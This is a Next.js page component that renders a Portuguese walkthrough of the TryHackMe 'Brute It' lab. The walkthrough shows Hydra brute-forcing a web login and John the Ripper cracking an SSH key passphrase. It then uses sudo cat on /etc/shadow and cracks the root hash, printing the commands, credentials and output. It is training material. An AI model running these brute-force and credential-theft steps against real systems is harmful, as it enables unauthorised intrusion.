import { Metadata } from "next"
import { ScrollAnimation } from "@/components/ScrollAnimation";

export const metadata: Metadata = {
  title: "TryHackMe - Brute It | fe1ps",
  description: "Walkthrough da máquina Brute It do TryHackMe, focando em brute force com Hydra, quebra de senha de chave SSH com John the Ripper e escalação de privilégios via sudo cat.",
}

// --- Componentes de Estilo ---

const CodeBlock = ({ children }: { children: React.ReactNode }) => (
  <pre className="bg-gray-900/50 p-4 rounded-md overflow-x-auto text-sm text-white/90 font-mono">
    <code>{children}</code>
  </pre>
);

const InlineCode = ({ children }: { children: React.ReactNode }) => (
  <code className="bg-gray-700/50 text-orange-300 py-1 px-1.5 rounded-md text-sm font-mono">
    {children}
  </code>
);

const InfoBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-blue-900/30 border-l-4 border-blue-400 p-4 rounded-md my-4">
        {children}
    </div>
);

const SummaryBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-gray-800/50 border-l-4 border-gray-500 p-4 rounded-md my-4">
        {children}
    </div>
);

const SuccessBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-green-900/30 border-l-4 border-green-400 p-4 rounded-md my-4">
        {children}
    </div>
);


// --- Componente Principal do Artigo ---

export default function BruteItArticle() {
  return (
    <div className="py-12">
      <div className="container mx-auto px-4">
        <ScrollAnimation>
          <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">TryHackMe - Brute It</h1>
        </ScrollAnimation>
        
        <div className="space-y-12">
            
          <ScrollAnimation delay={200}>
            <InfoBlock>
                <p><strong>Resumo da Máquina</strong></p>
                <p><strong>IP:</strong> <InlineCode>10.201.48.203</InlineCode></p>
                <p><strong>SO:</strong> Ubuntu Linux</p>
                <p><strong>Vetor de Ataque:</strong> Brute force em painel de administração web, revelando uma chave SSH privada. A senha da chave foi quebrada, e a escalação de privilégios foi obtida explorando uma permissão inadequada no <InlineCode>sudo</InlineCode> que permitia a leitura do arquivo <InlineCode>/etc/shadow</InlineCode>.</p>
            </InfoBlock>
          </ScrollAnimation>

          <ScrollAnimation delay={300}>
            <p className="text-gray-400">
                <strong>Tags:</strong> <InlineCode>#ctf</InlineCode> <InlineCode>#walkthrough</InlineCode> <InlineCode>#tryhackme</InlineCode> <InlineCode>#nmap</InlineCode> <InlineCode>#gobuster</InlineCode> <InlineCode>#hydra</InlineCode> <InlineCode>#ssh</InlineCode> <InlineCode>#john</InlineCode> <InlineCode>#privesc</InlineCode> <InlineCode>#sudo</InlineCode>
            </p>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">1. Reconhecimento e Enumeração</h2>
              <p className="mt-4 text-gray-300">
                O primeiro passo, como sempre, é realizar um reconhecimento completo do alvo para identificar vetores de ataque em potencial.
              </p>
              <h3 className="text-xl font-semibold mt-4">1.1. Varredura com Nmap</h3>
              <p className="mt-2 text-gray-300">Utilizei o <strong>Nmap</strong> com a flag <InlineCode>-sV</InlineCode> para detectar as versões dos serviços em execução nas portas abertas.</p>
              <CodeBlock>nmap -sV 10.201.48.203</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
              <CodeBlock>{`Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 18:40 -03
Nmap scan report for 10.201.48.203
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`}</CodeBlock>
              <SummaryBlock>
                  <p><strong>Pontos de Interesse Encontrados:</strong></p>
                  <ul className="list-disc list-inside mt-2">
                      <li><strong>Porta 22:</strong> SSH (<InlineCode>OpenSSH 7.6p1</InlineCode>)</li>
                      <li><strong>Porta 80:</strong> HTTP (<InlineCode>Apache httpd 2.4.29</InlineCode>)</li>
                  </ul>
              </SummaryBlock>

              <h3 className="text-xl font-semibold mt-4">1.2. Enumeração de Diretórios Web</h3>
              <p className="mt-2 text-gray-300">Com um servidor Apache rodando, o próximo passo foi buscar por diretórios e páginas ocultas. Utilizei o <strong>GoBuster</strong> para essa tarefa.</p>
              <CodeBlock>gobuster dir -u http://10.201.48.203/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</CodeBlock>
              <p className="mt-4 text-gray-300">O GoBuster rapidamente identificou um diretório promissor: <InlineCode>/admin</InlineCode>.</p>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">2. Acesso Inicial</h2>
              <p className="mt-4 text-gray-300">A fase de acesso inicial focou em explorar o painel de administração encontrado na porta 80.</p>
              
              <h3 className="text-xl font-semibold mt-4">2.1. Análise do Painel de Administração</h3>
              <p className="mt-2 text-gray-300">Ao acessar <InlineCode>http://10.201.48.203/admin</InlineCode>, encontrei uma página de login. Inspecionando o código-fonte da página, uma dica crucial foi revelada em um comentário HTML.</p>
              <p className="mt-2 text-gray-300">Isso confirmou dois nomes de usuário em potencial: <InlineCode>john</InlineCode> e <InlineCode>admin</InlineCode>. O formulário indicava que <InlineCode>admin</InlineCode> era o usuário do painel.</p>
              
              <h3 className="text-xl font-semibold mt-4">2.2. Brute Force com Hydra</h3>
              <p className="mt-2 text-gray-300">Sabendo o nome de usuário (<InlineCode>admin</InlineCode>) e a URL do formulário, realizei um ataque de força bruta com o <strong>Hydra</strong> para descobrir a senha.</p>
              <CodeBlock>{`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.201.48.203 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"`}</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
              <CodeBlock>{`[80][http-post-form] host: 10.201.48.203   login: admin   password: xavier`}</CodeBlock>
              <SuccessBlock>
                  As credenciais do painel de administração foram descobertas: <InlineCode>admin:xavier</InlineCode>
              </SuccessBlock>

              <h3 className="text-xl font-semibold mt-4">2.3. Obtendo e Quebrando a Chave SSH</h3>
              <p className="mt-2 text-gray-300">Após o login no painel com as credenciais encontradas, a página revelou uma chave SSH privada, provavelmente pertencente ao usuário <InlineCode>john</InlineCode>. A chave estava protegida por uma senha (passphrase).</p>
              <p className="mt-2 text-gray-300">Para obter acesso, precisei quebrar essa senha usando o <strong>John the Ripper</strong>.</p>
              <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-4">
                  <li><strong>Salvar a chave</strong> em um arquivo chamado <InlineCode>id_rsa</InlineCode>.</li>
                  <li><strong>Extrair o hash</strong> da chave usando <InlineCode>ssh2john</InlineCode>.
                      <CodeBlock>ssh2john id_rsa &gt; hash.txt</CodeBlock>
                  </li>
                  <li><strong>Quebrar o hash</strong> com o <InlineCode>john</InlineCode> e a wordlist <InlineCode>rockyou.txt</InlineCode>.
                      <CodeBlock>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</CodeBlock>
                      <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
                      <CodeBlock>{`Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
...
rockinroll       (id_rsa)       
...
Session completed.`}</CodeBlock>
                  </li>
              </ol>
              <SuccessBlock>
                  A senha da chave SSH de John foi descoberta: <InlineCode>rockinroll</InlineCode>
              </SuccessBlock>

              <h3 className="text-xl font-semibold mt-4">2.4. Obtendo Acesso e Capturando a Flag do Usuário</h3>
              <p className="mt-2 text-gray-300">Com a chave privada (<InlineCode>id_rsa</InlineCode>), o nome de usuário (<InlineCode>john</InlineCode>) e a senha da chave (<InlineCode>rockinroll</InlineCode>), o acesso via SSH foi possível.</p>
              <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-4">
                  <li>Ajustar as permissões da chave privada.
                      <CodeBlock>chmod 600 id_rsa</CodeBlock>
                  </li>
                  <li>Conectar-se via SSH.
                      <CodeBlock>ssh -i id_rsa john@10.201.48.203</CodeBlock>
                  </li>
              </ol>
              <p className="mt-2 text-gray-300">Após inserir a senha <InlineCode>rockinroll</InlineCode>, o acesso ao shell como usuário <InlineCode>john</InlineCode> foi concedido. Com isso, foi simples capturar a flag do usuário.</p>
              <CodeBlock>{`john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt`}</CodeBlock>
              <SuccessBlock>
                  <strong>user.txt:</strong> <InlineCode>thm{'{...user_flag...}'}</InlineCode>
              </SuccessBlock>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">3. Escalação de Privilégios</h2>
              <p className="mt-4 text-gray-300">Com acesso como <InlineCode>john</InlineCode>, o próximo passo foi escalar os privilégios para <InlineCode>root</InlineCode>.</p>
              <h3 className="text-xl font-semibold mt-4">3.1. Identificando o Vetor (`sudo`)</h3>
              <p className="mt-2 text-gray-300">A primeira e mais importante verificação foi checar as permissões <InlineCode>sudo</InlineCode> do usuário <InlineCode>john</InlineCode>.</p>
              <CodeBlock>john@bruteit:~$ sudo -l</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
              <CodeBlock>{`User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat`}</CodeBlock>
              <p className="mt-4 text-gray-300">Esta foi a descoberta crítica. O usuário <InlineCode>john</InlineCode> pode executar o comando <InlineCode>/bin/cat</InlineCode> como <InlineCode>root</InlineCode> e sem precisar de senha. Isso permite a leitura de qualquer arquivo no sistema.</p>

              <h3 className="text-xl font-semibold mt-4">3.2. Exploração e Quebra da Senha Root</h3>
              <p className="mt-2 text-gray-300">A estratégia foi usar essa permissão para ler o arquivo <InlineCode>/etc/shadow</InlineCode>, que contém os hashes das senhas de todos os usuários.</p>
              <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-4">
                  <li>Ler o conteúdo do <InlineCode>/etc/shadow</InlineCode> como <InlineCode>root</InlineCode>.
                      <CodeBlock>sudo cat /etc/shadow</CodeBlock>
                  </li>
                  <li>Copiar o hash da senha do usuário root.
                      <CodeBlock>root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::</CodeBlock>
                  </li>
                  <li>Salvar o hash em um arquivo (<InlineCode>hash_root.txt</InlineCode>) na máquina local e usar o <strong>John the Ripper</strong> para quebrá-lo.
                      <CodeBlock>john --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt</CodeBlock>
                      <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
                      <CodeBlock>{`...
football         (root)         
...
Session completed.`}</CodeBlock>
                  </li>
              </ol>
              <SuccessBlock>
                  A senha do usuário root foi descoberta: <InlineCode>football</InlineCode>
              </SuccessBlock>

              <h3 className="text-xl font-semibold mt-4">3.3. Obtendo Acesso Root e Capturando a Flag</h3>
              <p className="mt-2 text-gray-300">Com a senha do root em mãos, bastou usar o comando <InlineCode>su</InlineCode> para se tornar o superusuário.</p>
              <CodeBlock>{`john@bruteit:~$ su -
Password: 
root@bruteit:~# `}</CodeBlock>
              <p className="mt-2 text-gray-300">Após digitar a senha <InlineCode>football</InlineCode>, o acesso <InlineCode>root</InlineCode> foi obtido. A etapa final foi ler a flag.</p>
              <CodeBlock>root@bruteit:~# cat /root/root.txt</CodeBlock>
              <SuccessBlock>
                  <strong>root.txt:</strong> <InlineCode>thm{'{...root_flag...}'}</InlineCode>
              </SuccessBlock>
            </section>
          </ScrollAnimation>
        </div>
      </div>
    </div>
  )
}